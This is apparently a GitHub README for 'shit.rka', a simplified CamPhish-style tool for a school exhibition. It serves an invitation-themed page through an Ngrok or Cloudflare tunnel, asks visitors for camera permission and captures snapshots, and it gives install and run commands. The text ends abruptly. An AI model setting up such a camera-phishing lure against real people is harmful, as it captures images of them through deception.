







# shit.rka

shit.rka is a demonstration project designed for **School Education Exhibitions**.  
It shows how a simple webpage can request access to a device’s camera and capture a snapshot if permission is granted.  

- **For:** nmhss_chennai  

⚠️ This project is intended only for **educational use** in controlled environments (e.g., school exhibitions, labs). Unauthorized or malicious use is strictly prohibited.  

---

## What is shit.rka?

shit.rka is inspired by the CamPhish project, but simplified for educational presentation.  
It runs a local PHP server and uses **Ngrok** or **CloudFlare Tunnel** to generate a temporary public link.  
When opened, the webpage asks for camera permission. If the visitor allows, the tool captures a snapshot.  

---

## Features

- Webpage template:
  - **School Exhibition Invitation**  

- Cleanup script to remove unnecessary files and logs.  

- Educational branding:
  - For: **nmhss_chennai**  

---

## Tested On

- Kali Linux  
- Termux  
- Ubuntu  
- Parrot Sec OS  
- MacOS  
- Windows (WSL)  

---

## Installation & Requirements

shit.rka requires **PHP** and **wget**. Install them with:
* ```bash
apt-get -y install php wget unzip
git clone https://github.com/thxrunnn/shit.rka.git
cd shit.rka
bash shit.rka.sh
---
git log
